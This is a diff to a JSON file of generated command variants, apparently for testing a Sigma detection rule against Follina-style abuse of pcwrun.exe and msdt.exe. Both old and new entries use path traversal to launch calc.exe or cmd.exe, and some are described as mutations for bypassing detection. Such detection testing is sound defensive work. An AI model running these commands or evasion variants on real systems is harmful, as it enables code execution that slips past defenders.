@@ -1,14 +1,14 @@
 [
   {
-    "output": "pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param \"IT_BrowseForFile=..\\..\\..\\Windows\\System32\\calc.exe\"",
-    "explanation": "This command uses backslashes instead of forward slashes in the path traversal, which is a valid mutation technique for testing bypasses while remaining functionally equivalent."
+    "output": "C:\\\\Windows\\\\System32\\\\pcwrun.exe -i \"..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\" /c whoami",
+    "explanation": "This command simulates the exploitation of the Follina vulnerability by using pcwrun.exe with relative path traversal to execute a command. The command is modified with quotes and standard syntax to align with safe mutation techniques."
   },
   {
-    "output": "pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param \"IT_BrowseForFile=..\\\\..\\\\..\\\\Windows\\\\System32\\\\calc.exe\"",
-    "explanation": "This command uses double backslashes for escaping and path traversal, which is a safe mutation technique that maintains the original intent while testing for bypass potential."
+    "output": "C:\\\\Windows\\\\System32\\\\pcwrun.exe -i ..\\\\..\\\\Windows\\\\System32\\\\cmd.exe /c echo bypass",
+    "explanation": "This command uses relative path traversal to invoke cmd.exe via pcwrun.exe, simulating the Sigma rule's detection pattern. It omits unnecessary elements and uses standard syntax for safe testing."
   },
   {
-    "output": "pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param \"IT_BrowseForFile=..%2F..%2F..%2FWINDOWS%2Fsystem32%2Fcalc.exe\"",
-    "explanation": "This command uses URL encoding for path traversal, which is a safe mutation technique for testing bypasses while staying within the scope of the Sigma rule."
+    "output": "C:\\\\Windows\\\\System32\\\\pcwrun.exe -i \"..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\" /c ipconfig",
+    "explanation": "This command demonstrates a safe mutation by inserting quotes and using a benign command (ipconfig) to simulate the Sigma rule's behavior without malicious intent."
   }
 ]
